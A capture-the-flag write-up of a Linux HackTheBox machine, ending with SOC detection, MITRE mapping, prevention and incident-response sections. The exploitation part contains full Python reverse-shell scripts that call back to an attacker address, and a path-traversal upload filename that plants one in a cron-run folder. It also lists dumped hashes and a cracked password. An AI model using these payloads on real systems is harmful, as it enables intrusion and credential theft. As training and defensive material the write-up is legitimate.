# REDACTED Machine Writeup (Live Logging)
OS - Linux
Difficulty - Easy

>[!WARNING] : Machine name has been redacted because is still active on HackTheBox platform
## Recon - NMAP
Lets do nmap first
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Converser]
└─$ nmap -sC -sV -O -A -oN nmap.results $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 07:40 IST
Nmap scan report for 10.10.11.92
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://REDACTED.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: REDACTED.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   219.80 ms 10.10.14.1
2   220.69 ms 10.10.11.92

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.52 seconds
```

We have port 22 and port 80 as usual most of the times .  
This says it is Ubuntu machine  from the SSH port verrsion enum `OpenSSH 8.9p1 Ubuntu 3ubuntu0.13`
And this runs on apache , Apache 2.4.52. Lets add it to checklist
And the hostname is REDACTED.htb. Lets add that to etc/hosts

The next thing I usually do is , run ffuf for directory busting while I explore the website . Lets do that first  . But here are the results of ffuf

## Recon = Directory Busting
```bash
┌──(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Converser]
└─$ ffuf -u "http://REDACTED.htb/FUZZ" -w ~/Tools/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://REDACTED.htb/FUZZ
 :: Wordlist         : FUZZ: /home/teja/Tools/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

logout                  [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 537ms]
register                [Status: 200, Size: 726, Words: 30, Lines: 21, Duration: 545ms]
login                   [Status: 200, Size: 722, Words: 30, Lines: 22, Duration: 558ms]
about                   [Status: 200, Size: 2842, Words: 577, Lines: 81, Duration: 226ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 223ms]
convert                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 220ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 222ms]
:: Progress: [17769/17769] :: Job [1/1] :: 180 req/sec :: Duration: [0:01:40] :: Errors: 0 ::
```

Nothing much fancy other than the convert endpoint with 405 status . Which is Method Not Allowed error code . A POST method indeed

Lets explore the website . The root page redirects to login . Lets SQLi if that gives us anything . Not accepting without password

The login pasge is so simple , not lengthy view page source codes . Nothing lead here too
Exploring the website by registering account would be my next go to .

The website says this when we login with registered account ,
```text
We are REDACTED. Have you ever performed large scans with Nmap and wished for a more attractive display? We have the solution! All you need to do is upload your XML file along with the XSLT sheet to transform it into a more aesthetic format. If you prefer, you can also download the template we have developed here: [Download Template](http://REDACTED.htb/static/nmap.xslt)
```

Lets upload anything and see what happens and lets run subdomain with ffuf . And want to checkout what the template is 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" indent="yes" />

  <xsl:template match="/">
    <html>
      <head>
        <title>Nmap Scan Results</title>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(120deg, #141E30, #243B55);
            color: #eee;
            margin: 0;
            padding: 0;
          }
          h1, h2, h3 {
            text-align: center;
            font-weight: 300;
          }
          .card {
            background: rgba(255, 255, 255, 0.05);
            margin: 30px auto;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            width: 80%;
          }
          table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
          }
          th, td {
            padding: 10px;
            text-align: center;
          }
          th {
            background: rgba(255,255,255,0.1);
            color: #ffcc70;
            font-weight: 600;
            border-bottom: 2px solid rgba(255,255,255,0.2);
          }
          tr:nth-child(even) {
            background: rgba(255,255,255,0.03);
          }
          tr:hover {
            background: rgba(255,255,255,0.1);
          }
          .open {
            color: #00ff99;
            font-weight: bold;
          }
          .closed {
            color: #ff5555;
            font-weight: bold;
          }
          .host-header {
            font-size: 20px;
            margin-bottom: 10px;
            color: #ffd369;
          }
          .ip {
            font-weight: bold;
            color: #00d4ff;
          }
        </style>
      </head>
      <body>
        <h1>Nmap Scan Report</h1>
        <h3><xsl:value-of select="nmaprun/@args"/></h3>

        <xsl:for-each select="nmaprun/host">
          <div class="card">
            <div class="host-header">
              Host: <span class="ip"><xsl:value-of select="address[@addrtype='ipv4']/@addr"/></span>
              <xsl:if test="hostnames/hostname/@name">
                (<xsl:value-of select="hostnames/hostname/@name"/>)
              </xsl:if>
            </div>
            <table>
              <tr>
                <th>Port</th>
                <th>Protocol</th>
                <th>Service</th>
                <th>State</th>
              </tr>
              <xsl:for-each select="ports/port">
                <tr>
                  <td><xsl:value-of select="@portid"/></td>
                  <td><xsl:value-of select="@protocol"/></td>
                  <td><xsl:value-of select="service/@name"/></td>
                  <td>
                    <xsl:attribute name="class">
                      <xsl:value-of select="state/@state"/>
                    </xsl:attribute>
                    <xsl:value-of select="state/@state"/>
                  </td>
                </tr>
              </xsl:for-each>
            </table>
          </div>
        </xsl:for-each>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

After looking at the template, I think we have scope for XXE . 
No subdomains found from ffuf
And from the about section of the page , we get 3 IDs.
- ##### **FisMatHack**
- ##### **Arturo Vidal**
- ##### **David Ramos**

## Initial Foothold

And we can download source code too . This is the source code structure
```bash
┌──(teja㉿x50ubr)-[~/…/Machines/Active/Converser/Code]
└─$ tree                       
.
├── app.py
├── app.wsgi
├── install.md
├── instance
│   └── users.db
├── scripts
├── source_code.tar.gz
├── static
│   ├── images
│   │   ├── arturo.png
│   │   ├── david.png
│   │   └── fismathack.png
│   ├── nmap.xslt
│   └── style.css
├── templates
│   ├── about.html
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   └── result.html
└── uploads
```

Lets see app.py , what it says 
- This is a flask app , and the location of the DB file is here
	- `/var/www/REDACTED.htb/instance/users.db`
- Tried navigating to that URL , didn't work 
	- `http://REDACTED.htb/instance/users.db`
- The convert endpoint is using etree 
	- `from lxml import etree`

- And there is a line which says 
	- `etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)`
	- Maybe this a cue . The validation is off .  

- Nope actually those validations are good one.  The validations are purely for XML , but there are no validations for other content . LIke revshell , or dangerous characters
- And from about page we got this too 
	- `contact@REDACTED.htb`

I've gone through all of the files in source code, nothing looks interesting 
Uploaded the nmap results scan in XML format after running it for second time . And the XSLT file too , and got beautful output with styling of nmap

Tried LFI too . No luck with the view endpoint . 
Now check the checklist for exploits

Okay we have a blog that says this apache version is vulnerable to 
```text
The following vulnerabilities exist: - CVE-2022-22719: mod_lua Use of uninitialized value of in r:parsebody - CVE-2022-22720: HTTP request smuggling vulnerability - CVE-2022-22721: Possible buffer overflow with very large or unlimited LimitXMLRequestBody - CVE-2022-23943: mod_sed: Read/write beyond bounds
```

If you see XML . It reference XML bug which matches out scenario . Lets check out that CVE-2022-22721 . But this CVE causes out of bound writes . No information disclosure or webshell type

When I registered with **`<i>haha</i>`** name , the about is page is not showing earlier page like contacts and source code  It is showing **`Another test of vulnerability`**

Huhh what this could be . Lets login with regular username and see .  But for regular account name , is showing the expected version .  SO there is some filtering going for dangerous characters . . . 

The main code app.py says Changemeplease for Secret Key . Maybe it is weak and we can crack it I guess . . . 

On decoding with flask-unsign , we see this output
```bash
┌──(env)─(teja㉿x50ubr)-[~/…/HTB/Machines/Active/Converser]
└─$ flask-unsign -d -c 'eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6ImhhaGEifQ.aQBR3g.8GebZKWx9ecO2I9dlgUUwYQpOYM'
{'user_id': 7, 'username': 'haha'}
```

Which means , there are 6 users or  7 users excluding me. To forge I need usernames too , but the first user will be always admin . Maybe we can do that or else we have to find a way to enumberate users

While running flask-usnign for cracking SECRET KEY , reviewing the code again .
One thing is the passwords are MD5 hashed . Easier to crack

And we can login if the session cookie has user_id , it is not validating the username . 
And if username already exists while registering , it throws error . So I've registered with admin , administrator and root , all of them are accepted . So there are no these accounts existing on the box. 

Going through the code got me thinking if we can find any vulns on lxml package which is parsing the XML we have uploaded. 

And we found one **`CVE-2024-3572`**
The CVE says it is vulnerable when `read_network=True` and `resolved_entities=True` . But we have resolved_entities false , but we don't have read_network . We have no_network param.

Wonder what's the difference ?
no_network True -> read_network False

read_network allows external references while no_network doesn't . So
- no_network True -> read_network False
- no_network False -> read_network True

But can we read internal files , this only disallows HTTP and FTP . But if we use file:// , maybe we can read sensitive files like env variables , secret keys and database files . . . 

Lets check that  . Nope that's not possible because **`load_dtd=False`** and **`resolved_entities=False`**

But lets try anyway . Maybe we can try XXE from XSLT file . Nope not working at the moment . 
Nope that is not working 
**`Error: Cannot resolve URI file:///var/www/REDACTED.htb/app.py`** for mal.xslt file payload

There is a file called **`install.md`** which suggests we can run this using apache also with file **`app.wsgi`** . 

And this app.wsgi has 
```python
import sys
sys.path.insert(0, "/var/www/REDACTED.htb")

from app import app as application
```

So it says , the modules are searched first in **`/var/www/REDACTED.htb`** folder . So this is added first in path environment variable . So imported modules are checked here first . 

That makes it vulnerable where packages imported in app.py can be called from here . But the next question is how do we write it ?

We have to make sure it is recursive , like code searches recursively inside that dir . NOPE
We cannot . It only searches in that one folder and doesn't go deep . But how to write to that folder ?

Maybe this CVE helps , it is buffer overflow memory writes . Can we use it write that creates a os.py in our base folder.

The code is not sanitizing any file names , maybe we can intercept the request in burp and make it write to Root Dir .So that next time when it loads , we get reverse Shell ??

We can spoof sqlite3 file and upload it as it being called multiple times in code . So lets spoof sqlite3 file and add a connect() function which has python reverse shell

And we can upload this file as XML because , it is checking extensions , or validating contents . It is saving first and try to parse later . So the file is being saved . So there is a shot this could work . Let's see

Created sqlite3.py file
```python
import socket
import subprocess
import os
import pty

def connect(DB_NAME):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.14.2", 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/bash")
```

Since the connect function in app.py is sending param , I've added dummy function parameter which doesn't do anything

Now uploading the file in the XML file upload dialog box . Intercepting the Burp request
And we see this request 

```req
POST /convert HTTP/1.1
Host: REDACTED.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------283673540533284347091909558362
Content-Length: 12705
Origin: http://REDACTED.htb
Connection: keep-alive
Referer: http://REDACTED.htb/
Cookie: session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6ImhhaGEifQ.aQBdgw.lV19xpSponin_JeXF3FBaerPfw0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------283673540533284347091909558362
Content-Disposition: form-data; name="xml_file"; filename="sqlite3.py"
Content-Type: text/x-python

import socket
import subprocess
import os
import pty

def connect(DB_NAME):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("10.10.14.2", 4444))
	os.dup2(s.fileno(), 0)
	os.dup2(s.fileno(), 1)
	os.dup2(s.fileno(), 2)
	pty.spawn("/bin/bash")


-----------------------------283673540533284347091909558362
```

Above is the original request intercepted in Burp. I've modified the file name to **`../sqlite3.py`** in the real request . So when it to joined with uploads folder in the app.py code , it will be saved to root dir . And from there connect function in sqlite3 will be called if all goes good and we get shell

We got this error after uploading , because it is not XML file
`Error: Start tag expected, '<' not found, line 1, column 1 (sqlite3.py, line 1)`

Now lets refresh the screen , because this code  from app.py is fetching connect( ) function and we should get shell
```python
@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE user_id=?", (session['user_id'],))
    files = cur.fetchall()
    conn.close()
    return render_template('index.html', files=files)
```

But we didn't get shell and the webpage loaded . Maybe due to cache issue . Lets upload files now and see . Valid xml and xslt file , it should get us shell if bug we expected works

Nope . Not working . File uploaded successfully and parsed beautifully . Maybe we gave path wrong in the request . Lets give absolute path which is there in the **`app.wsgi`** file 

This time I gave this path in the request .
**`Content-Disposition: form-data; name="xml_file"; filename="../../../../../../../../../../../../var/www/REDACTED.htb/sqlite3.py"`**

Nope not this time too . There is a static folder from where this sample xslt file and images are being rendered . Lets see if we can save the a sample PNG file into that folder and open it . To check if the parameter tampering is working or not

I've tried running the application locally . It is saving the as we are expecting , and it calling reverse shell also . Maybe we gave **`/bin/bash`** . It doesn't have bash I guess . Lets try with **`/bin/sh`** by updating our sqlite3.py file

Some reason it is not working . Maybe the firewall rules I guess . They restricted outbound access or what I don't know . 

But there is XXE vulnerability in XSLT because the parser is default parsed in the code . So maybe XXE is possible here . 

NOPE NOT working . There is one thing caught my eye here is ffuf dir buster showed javasciprts . Maybe we can do something about this . . . 

Went to discord for a nudge . And

Shitt. I was so fixating on my above sqlite3 exploit , I overlooked one obvious detail which could have gotten me shell very soon earlier

```markdown
To deploy REDACTED, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/REDACTED.htb/scripts/*.py; do python3 "$f"; done
"""
```

See this code , the last cronjob , i thought they were just suggesting , but if you look closely . The server actually implemented it and running it every minute . . . 

So we can place python script in scripts folder and get shell . 
I was fixating on the sqlite3 because it was working locally , I got shell when the package was loaded . And the app was querying DB . . .  It wasn't working on the challenge , made me thinking some wrong I must be doing and keep focusing on that

But now I can get reverse shell . Thanks to the discord community . Who give just enough nudge so you know where to focus and figure it out yourself . .  .

Lets place our reverse shell in scripts folder . Same code as sqlite3 , just removed the function
```python
import socket
import subprocess
import os
import pty

print("Hey I'm called")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.2", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
```

Modified the upload request in Burp
**`Content-Disposition: form-data; name="xml_file"; filename="../scripts/rev.py"`**

## User Privilege Escalation 

Started my netcat listener . Lets wait for a minute and see . 
And here we are
```bash
┌──(env)─(teja㉿x50ubr)-[~/…/Machines/Active/Converser/Code]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.92] 52614
www-data@REDACTED:~$ 

```

Next thing is stabilising the shell. Making the echo go away with **`stty raw -echo;fg`**

Lets check the DB and see who are the 7 users ahead of us 
```sqlite3
sqlite> select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|k3ndr1ck|f0ea24fa9f2fedbbc2151899e61b8648
6|<i>haha</i>|4e4d6c332b6fe62a63afe56171fd3725
7|haha|4e4d6c332b6fe62a63afe56171fd3725
8|admin|4e4d6c332b6fe62a63afe56171fd3725
9|administrator|4e4d6c332b6fe62a63afe56171fd3725
10|root|4e4d6c332b6fe62a63afe56171fd3725
sqlite> 
```

And see if any of the users above match from **`/etc/passwd`** . 
We only have root and fishmathack on the box

```bash
www-data@REDACTED:~/REDACTED.htb/instance$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
```

So let's crack fishmathack first  . 
Since it is MD5 , it is easily crackable . Crackstation is the best website online for this 
Cracked is successfully **`Keepmesafeandwarm`**

Added it to the list of secrets found . Let's switch user on the box now 
Yes it works . Same password used for both . NEVER DO THIS IN REAL TIME . It is called password spraying . 

Now that we have creds  , we can do SSH for better shell . 
After doing sudo -l , we see we have access to one perl script which can be run as root

## Root Privilege Escalation

```bash
fismathack@REDACTED:~$ sudo -l
Matching Defaults entries for fismathack on REDACTED:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on REDACTED:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
fismathack@REDACTED:~$ file /usr/sbin/needrestart 
/usr/sbin/needrestart: Perl script text executable
```

Lets explore it .
The binary has a enable nagios plugin mode . Let's go through the code and see what is it doing 
Nothing interesting I guess

This is a open source tool 
```bash
ismathack@REDACTED:~$ sudo /usr/sbin/needrestart --version

needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.
```

Lets see if this version has any vulns 
There is a CVE for this **`CVE-2024-48990`** . This is a privesc 

Not a clear straight forward PoC . But I understand some path hijacking 
I had dump that code locally to look it in sublime for better understanding . 

But I understood one thing , I got the exploit . comp
## THINGS TO CHECK
- [x] Apache 2.4.52 version vuln
- [x] Check convert endpoint with POST method 
- [x] Check XXE attack . How it works
- [x] Check CVE -2022-22721
- [x] Check Jinja or DTD syntax exploit for flask
- [x] Check if you can crack cookie with flask-unsign
- [x] Check if etree package is vulnerable


## SECRETS FOUND
[ EMAIL ] - contact@REDACTED.htb
[ DB ROW ] fismathack : 5b5c3ac3a1c897c94caad48e6c71fdec : Keepmesafeandwarm
[ DB ROW ] k3ndr1ck : f0ea24fa9f2fedbbc2151899e61b8648
[ DB ROW ] <i>haha</i> : 4e4d6c332b6fe62a63afe56171fd3725
[ DB ROW ] haha : 4e4d6c332b6fe62a63afe56171fd3725
[ DB ROW ] admin : 4e4d6c332b6fe62a63afe56171fd3725
[ DB ROW ] administrator : 4e4d6c332b6fe62a63afe56171fd3725
[ DB ROW ] root : 4e4d6c332b6fe62a63afe56171fd3725
[ LINUX ACCOUNT ] fishmathack : Keepmesafeandwarm

## 1. What actually happened

Alright — here’s the short, plain timeline of the compromise, from the writeup you dropped.

- **`Recon`**: attacker found an HTTP app (`REDACTED.htb`) and an upload/`/convert` endpoint that accepts XML/XSLT (and a downloadable `nmap.xslt`). Nmap/ and fuf details show ports and endpoints.
- **`App code & config`**: the app is a Flask site served from `/var/www/REDACTED.htb`. The code uses `lxml.etree` for XML/XSLT, stores uploads under `/var/www/REDACTED.htb/uploads`, and the repo + `scripts/` folder and a cronjob run scripts from `/var/www/REDACTED.htb/scripts` every minute as `www-data`. That cron job is the pivot.
- **`Initial foothold`**: attacker first tried XXE /and xml parser tricks and local file write via path-traversal in uploaded filename (e.g. `../scripts/rev.py`) parameter of the convert endpoint payload. The app saved uploaded files without sufficient sanitization so attacker wrote a Python reverse-shell into `scripts/`. Because the server runs `for f in /var/www/REDACTED.htb/scripts/*.py; do python3 "$f"; done` from cron, the malicious `.py` was executed by `www-data` automatically and produced a reverse shell to the attacker. Boom: low-priv shell as `www-data`.
- **`Privilege escalation`**: attacker accessed the  DB (users table) and cracked MD5 password hashes . Using creds, attacker SSH’d and switched to the user `fismathack`. `sudo -l` showed `NOPASSWD` permission for `/usr/sbin/needrestart` (a Perl script). That was abused to escalate to root (there’s a known CVE/Circumstances referenced).

## 2. SOC Detection In Simple Technical Terms

| Attack Step                                       | What it looks like to a SOC                                                                                                                                                                                                                                                                          |
| ------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Recon (nmap, ffuf)                                | Lots of repetitive requests from one IP hitting many paths (e.g. `/`, `/login`, `/convert`, `/javascript`, `/static/*`), spikes in 401/405/302/200 patterns from same client; high rate of 404/405 during short window (ffuf + nmap activity).                                                       |
| Upload / XXE / template abuse                     | `POST /convert` requests with `multipart/form-data` where `filename=` contains weird extensions (not `.xml`) or unusual content-type (e.g. `text/x-python`) — or file upload requests where the body isn’t valid XML but still accepted. Look for `xml_file` uploads and parse errors in app logs.   |
| Path-traversal in upload filename                 | Upload requests where `filename` contains `..` or absolute paths (e.g. `filename="../scripts/rev.py"` or `filename="../../../../var/www/REDACTED.htb/sqlite3.py"`). Correlate with new file creation outside normal uploads dir.                                                                    |
| Malicious script created in webroot (`/scripts`)  | Filesystem/file-integrity alert: new `.py` under `/var/www/REDACTED.htb/scripts` (or `uploads`) created by `www-data` shortly after an upload request. Hash the file, keep copy forensics.                                                                                                          |
| Cron executing webroot scripts (automatic RCE)    | Process creation: `python3 /var/www/REDACTED.htb/scripts/<file>.py` (or `python3` invoked by `cron` as `www-data`); or syslog/cron logs showing the `for f in /var/www/REDACTED.htb/scripts/*.py` loop running each minute. Correlate with time-of-upload then inbound reverse connection.         |
| Reverse shell / outbound C2                       | Outbound TCP from the web host to unusual external IP/port (e.g. 10.10.14.2:4444) or long-lived TCP sessions from `www-data` process to unknown host. Netflow/firewall shows new destination port and host.                                                                                          |
| DB access / credential harvesting                 | Web shell or `www-data` reading `/var/www/REDACTED.htb/instance/users.db` (file read events) and DB rows showing MD5 hashes — subsequent brute/crack activity or successful `ssh`/`su` events for users like `fismathack`. Watch for sqlite file reads, DB dumps, or unusual `sqlite3` invocations. |
| Privilege escalation via sudo misconfig           | `sudo -l` results or `sudo /usr/sbin/needrestart` executed by `fismathack` (NOPASSWD). Alert on NOPASSWD usage of unusual binaries (especially scripts/perl) or any invocation of `needrestart` by non-root. Correlate with sudden root activity.                                                    |
| Persistence (cron / scheduled re-exec)            | Repeated new processes or recurring executions of webroot scripts (same timestamp every minute), new cron entries or modifications to `/etc/crontab` referencing web paths. File-mod timestamps changing regularly.                                                                                  |
| Lateral movement / SSH logins                     | `auth.log` shows SSH login attempts or successes from the attacker IP to `fismathack` (or new authorized_keys added); suspicious `su`/`sudo` operations after initial web compromise. Monitor for reused creds (cracked MD5 passwords).                                                              |
| Suspicious app parsing errors / template activity | Repeated parser errors like “Start tag expected, '<' not found” in app logs (upload wasn’t XML) or XSLT/template fetches (downloads of `nmap.xslt`) — could indicate attempts to abuse XML/XSLT processing (XXE/XSLT).                                                                               |
## 3. MITRE ATT&CK quick map (most relevant)

- Initial Access: **T1190** Exploit public-facing app / file upload abuse.
- Execution: **T1059.006** Python. (cron executing python scripts).
- Persistence: **T1053.003** Cron. (scripts executed periodically).
- Privilege Escalation: **T1548** Abuse elevation control mechanisms (sudo NOPASSWD on `needrestart`).
- Credential Access: **T1110** Brute force / password cracking (MD5 hashes cracked).
- Command and Control: **T1071.001** Web protocols (reverse shell over TCP).

## 4. How to prevent it

1. Block the web server from talking to the internet by reverse shells. If it can’t call out, the reverse shell can’t communicate.
2. Make sure config files and code , and cron job scripts are not visible to the internet . Make sure the endpoints and subdomains like dev are safe which usually have .git folders and can give away entire application
3. Remove the special "no sudo password" access to regular users. Restrict them 
4. Stop trusting uploaded filenames. Give uploaded files new random names and save them outside the website folder. Don’t let filenames have `..` in them which can lead to LFI
5. Don’t keep secret files or the database where anyone can upload to. Move them out of the web folder where they are out of reach
6. Use strong password hashing (like bcrypt or argon2). MD5 is old and weak . Change it and make people reset weak passwords and enforce stromger password policies
7. Scan uploads with WAF so that they are filtered before they reach the server to avoid reverse shell and other XSS scripts of commands
8. Run the app in a minimal docker container which has only the files it needed . 
9. Log file changes and watch for new files in the web folders.
10. Practice secure coding 

## 5. Incident Response (IR) flow 

### Phase 1 - Preparation
- Enable logging for uploads, cron jobs, and outbound traffic.
- Keep clean server images for rebuilds.
- Have detection rules for `..` in uploads or reverse shells.

### Phase 2 - Identification

- Look SIEM alerts for weird upload request or reverse shell connection.
- Cron logs show Python scripts running from `/scripts`.
- App logs: strange filenames like `../rev.py`.
- Outbound traffic from webserver to unknown IP.

### Phase 3 - Contain

- Block outbound traffic to attacker IP.
- Disable or comment out cron that runs `/scripts`.
- Kill reverse shell process.
- Isolate the host from the network.
    

### Phase 4 - Eradication

- Delete the malicious `rev.py` after copying for forensics.
- Fix upload code to sanitize filenames.
- Remove NOPASSWD sudo access.
- Reset credentials and clear any new SSH keys.

## Phase 5 - Recovery

- Rebuild from a clean image or restore a backup.
- Reapply only clean configs and updated code.  
- Test uploads and cron job safely.  
- Reconnect to the network after checks pass.


### Phase 6 - Lessons Learned

- Make a short report with root cause, attacker IP, and timeline.  
- Add detections for path traversal and cron abuse.  
- Train devs to never execute uploads again.  
- Do a tabletop exercise with the team.